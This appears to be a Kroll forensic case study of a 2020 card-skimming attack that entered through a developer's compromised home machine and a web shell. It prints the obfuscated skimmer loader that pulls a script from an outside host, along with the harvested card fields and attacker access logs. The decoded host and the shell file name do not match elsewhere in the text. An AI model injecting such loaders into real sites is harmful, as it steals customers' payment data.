<!-- Source: https://www.kroll.com/en/publications/cyber/case-studies/online-skimming-attack-work-from-home-arrangements | Title: Online Skimming Attack Facilitated by Work-From-Home Arrangements | Seed: https://www.kroll.com/en (Kroll (Duff & Phelps)) -->

Digital Forensics and Incident Response
# Online Skimming Attack Facilitated by Work-From-Home Arrangements
Share
[https://www.linkedin.com/sharing/share-offsite/url=https%3A%2F%2Fwww.kroll.com%2Fen%2Fpublications%2Fcyber%2Fcase-studies%2Fonline-skimming-attack-work-from-home-arrangements](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fwww.kroll.com%2Fen%2Fpublications%2Fcyber%2Fcase-studies%2Fonline-skimming-attack-work-from-home-arrangements "Linkedin")mailto:?subject=Online%20Skimming%20Attack%20Facilitated%20by%20Work-From-Home%20Arrangements&body=https%3A%2F%2Fwww.kroll.com%2Fen%2Fpublications%2Fcyber%2Fcase-studies%2Fonline-skimming-attack-work-from-home-arrangements
In May 2020, Kroll was contacted by a purveyor of high-end meats after receiving several customer complaints of potentially fraudulent credit card activity. The fraud allegations were raised after several customers observed unauthorized transactions on their credit cards shortly after placing orders through the purveyor’s e-commerce website. Kroll quickly assigned one of their seasoned Payment Card Industry (PCI) forensics investigators to review and investigate the matter.
At the beginning of the global pandemic, the US’s meat supply chain was disrupted after many workers fell ill with COVID-19, causing an unprecedented shortage of meat across the nation. Many brick-and-mortar stores placed restrictions on the number of meat products that consumers could buy at a time while some decided to temporarily close their doors to the general public and switch part or all of their operations to online retail channels.
On March 16, this particular meat purveyor experienced a dramatic, and rather sudden, increase in sales through their e-commerce platform after closing all their retail locations and sending their corporate employees home. At first, the retailer welcomed to increase in sales, however, by mid-May and after receiving a dozen customer complaints, the retailer decided to begin an investigation to determine if their operation had been compromised.
##### Exposing the Online Skimming Attack
Kroll’s PCI forensics team began the payment card fraud investigation by simulating an online customer transaction. Kroll’s investigators used a test credit card to trigger a transaction and trace the cardholder data flow through the retailer’s network to identify its final destination. In a legitimate transaction, the cardholder enters their data (primary account number (PAN), cardholder’s name, expiration date, billing address and security code) into the retailer’s checkout page and is subsequently sent to the merchant’s acquirer for authorization upon the customer clicking the “submit” or equivalent button. What Kroll’s investigators found instead was that every time a customer clicked the “submit” button on the retailer’s checkout page, an encoded script (hly.js) was executed which collected and transmitted the customer’s cardholder data to an unknown URL (yjctw.com) via an HTTP GET request.  
|  **Data Elements Harvested by the Script:**
  * CCNameOnCard
  * CCNumber
  * expirationMonth
  * expirationYear
  * CCCVV2
  * CCStreet
  * CCPostalCode

 |  
| --- |  
|  **Encoded Script:** a=document.createElement(String.fromCharCode (115,99,114,105,112,116)),a.src=String.fromCharCode(104,116,116, 112,115,58,47,47,116,104,120,114,113,46,99,111,109,47,103,109,116,46,106,115), document.body.appendChild(a) **Decoded Script:** <script src=https:// yjctw.com/hly.js></script>  |  
| --- |  
As with any cyber security investigation, identifying the initial time of an intrusion or compromise is critical as it marks the point in time from which incident responders need to begin analyzing data. Kroll discovered that the script had been installed on the retailer’s webserver on March 20, right at the beginning of COVID-19, and only four days after the retailer initially closed all its retail locations and sent its workforce home.
##### Tracking the Initial Access
The sequence and timing of events led Kroll investigators to focus on the retailer’s web hosting administrative panel as the potential source of initial access. Investigators discovered that the administrative panel was configured with an “allow list” that restricted access to the client’s webserver from a limited number of authorized IP addresses. Under normal operating conditions, the allow list would only include the retailer’s public corporate IP address; pre-COVID-19, the web developers worked onsite and accessed the administrative panel through the retailer’s network. But after sending all employees home on March 16, the developers needed continuous access to the administrative panel for regular website maintenance and support and, consequently, the allow list was modified to include all developers’ home IP addresses.
With this in mind, Kroll investigators began analyzing the webserver’s access logs, focusing on the early hours of March 20, the day the script was installed on the webserver. What they discovered was that, on March 20 around 1:34 a.m., a developer’s machine was used to access the retailer’s administrative panel from an authorized IP address (47.184.200.242). Forty minutes after the initial access, a web shell named 1234.php was installed on the server. The web shell was later called from an unknown IP address (14.37.176.182) via an HTTP POST request and used to insert the malicious code that led to the exfiltration of cardholder data. Although the threat actors could have inserted the malicious code during the initial access, Kroll investigators believe that the web shell was installed to obtain persistent access to the webserver without having to rely on a developer’s machine to bypass the allow list. Kroll investigators later confirmed that the developer’s machine used in the attack had been compromised before March 20.  
|  **Authorized IP Address:** 47.184.200.242 - [20/Mar/2020:01:34:29 -0400] "GET /index.php/AllSteaks_admin/dashboard/ HTTP/1.1" 200 1127 "https://www.AllSteaks.com/index.php/AllSteaks_admin" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0“  47.184.200.242 - [20/Mar/2020:01:34:40 -0400] "POST /index.php/AllSteaks_admin/dashboard/ HTTP/1.1" 302 20 "https://www.AllSteaks.com/index.php/AllSteaks_admin/dashboard/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0“  **Unknown IP Address:** 14.37.176.182 - [20/Mar/2020:02:16:10 -0400] "GET /1231.php HTTP/1.1" 200 106 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0“  14.37.176.182 - [20/Mar/2020:02:16:24 -0400] "POST /1231.php HTTP/1.1" 200 2241 "https://www.AllSteaks.com/1231.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"   |  
| --- |  
The cyberattack perpetrated against the meat retailer was opportunistic, yet carefully planned and flawlessly executed. The perpetrators selected the meat retailer’s web developer as their main target, presumably because web developers are known to have higher levels of access than the regular user. Kroll investigators also believe that the threat actors conducted extensive reconnaissance through a popular professional networking site prior to the attack and used the collected intelligence to launch a targeted social engineering attack against the developer.
##### Understanding the Everchanging Attack Surface
With a large portion of the world’s population working remotely, it is important to emphasize that security controls, particularly network-based controls, often designed to protect on-premises information systems may not be as effective in protecting a distributed mobile workforce. The strength of network-based controls, such as IP allow lists, is directly proportional to the trust placed on the network of origin (networks from where connections are initiated). Consequently, when organizations have no control over origin networks (e.g., employees’ home networks), the trust is broken, significantly diminishing the control’s effectiveness.
In retrospect, the attack against the meat retailer could have been prevented, or at least detected before significant damage was done, if enhanced host security controls had been deployed across all corporate endpoints by implementing multi-factor authentication for any administrative access to the company’s cloud-based information resources, or by forcing all end-user traffic through the corporate VPN gateway. Nonetheless, learning from past security incidents and improving one’s security posture is the key to preventing the same or similar security incidents from occurring in the future.
COVID-19 has undeniably enlarged the attack surface of many organizations with a remote workforce, especially those not equipped from a people, process and technology standpoint to handle the increased volume of remote traffic. It is therefore important for organizations to continuously perform security risk assessments to understand how their attack surface changes over time, and to develop appropriate security architectures that will balance usability, security and cost.
##### Strengthening Remote Work Defenses and PCI Security
Kroll worked with the meat retailer to significantly strengthen the security of their remote access infrastructure while reducing their PCI scope by implementing foundational security hygiene items, including:
  * Requiring multi-factor authentication for all administrative accounts and systems storing, processing and/or transmitting cardholder data and any other high-value business data 
  * Performing a comprehensive vulnerability assessment prioritizing the deployment of critical patches across the environment
  * Guiding the client through a migration to a hosted iframe (or SAQ-A) solution where all the payment fields (e.g., PAN, cardholder’s name, expiration date, security code, billing address) displayed on the merchant’s checkout page are hosted by the merchant’s acquirer, significantly reducing the client’s scope of PCI compliance


Having an experience PCI forensics investigation team on your side to quickly respond to suspected security incidents and payment card data breaches can dramatically reduce an attacker’s dwell time while minimizing your damages. Security incidents and data breaches are inevitable; it is how you respond to them that will set you apart from your competition and win your customers’ loyalty. Kroll’s PCI investigators are available to help 24x7x365, anywhere in the world. 
[Stay Ahead with Kroll](https://www.kroll.com/en/services)
[Cyber and Data Resilience](https://www.kroll.com/en/services/cyber)
Kroll merges elite security and data risk expertise with frontline intelligence from thousands of incident responses and regulatory compliance, financial crime and due diligence engagements to make our clients more cyber- resilient.
[24x7 Incident Response](https://www.kroll.com/en/services/cyber/reactive-services/incident-response)
Kroll is the largest global IR provider with experienced responders who can handle the entire security incident lifecycle.
[Payment Card Industry Services](https://www.kroll.com/en/services/cyber/regulatory-compliance-assessments/pci-services)
Kroll offers a wide range of services for both merchants and payment processors, from audits to incident management services, to pragmatic approaches for strengthening your cyber defenses.
[Cyber Vulnerability Assessment](https://www.kroll.com/en/services/cyber/threat-exposure-management/vulnerability-assessment)
Proactively identify vulnerable systems and devices that may be exploited by an attacker or malicious software, often resulting in data loss or breach. 
[Cyber Risk Assessments](https://www.kroll.com/en/services/cyber/cyber-risk-assessments)
Kroll's cyber risk assessments deliver actionable recommendations to improve security, using industry best practices & the best technology available.
[Malware and Advanced Persistent Threat Detection](https://www.kroll.com/en/services/cyber/reactive-services/malware-advanced-persistent-threat-detection)
Our expertise allows us to identify and analyze the scope and intent of advanced persistent threats to launch a targeted and effective response.
We use cookies to remember users and provide the best possible experience. Some cookies are essential, others help us improve your experience through insights on how the site is used. Please visit our [cookie notice](https://www.kroll.com/en/cookies-policy) for more information.
Manage Preferences Decline Accept All
## Cookies Preference Center
## Cookies Preference Center
  * ### Your Privacy
  * ### Essential Cookies
  * ### Functional Cookies
  * ### Analytics Cookies
  * ### Advertising Cookies


#### Your Privacy
We use cookies to remember users and give you the best possible experience. Some cookies are essential, others help us improve your experience through insights on how the site is used. Please visit our cookie notice for [more information](https://www.kroll.com/cookies-policy).
#### Essential Cookies
Always Active
These cookies are essential in order to enable you to move around the site and use its features. Without these cookies, services you have asked for cannot be provided.
Cookies Details
#### Functional Cookies
Functional Cookies
These cookies enable the website to function. Certain functional cookies also allow us to respond to service or other inquiries received through a form.
Cookies Details
#### Analytics Cookies
Analytics Cookies
Analytics cookies track aggregate site performance, web speed, traffic sources, video plays and other aggregate data across the site. These cookies allow us to personalize web experience by type of visitor and, upon certain circumstances, by individual user. Individual user information is recognized through form completions or response to other marketing campaigns.
Cookies Details
#### Advertising Cookies
Advertising Cookies
Upon occasion, our firm advertises on certain media sites and these cookies track campaign performance. Cookies may be set by our firm or by our advertising partners. The cookies may be used by those companies to build a profile of your interests and show you relevant adverts on other sites. They do not store directly personal information, but are based on uniquely identifying your browser and internet device. If you do not allow these cookies, you will experience less targeted advertising.
Cookies Details
Back Button
### Cookie List
Filter Button
Consent Leg.Interest
checkbox label label
checkbox label label
checkbox label label
Clear
  * checkbox label label


Apply Cancel
Confirm
Allow All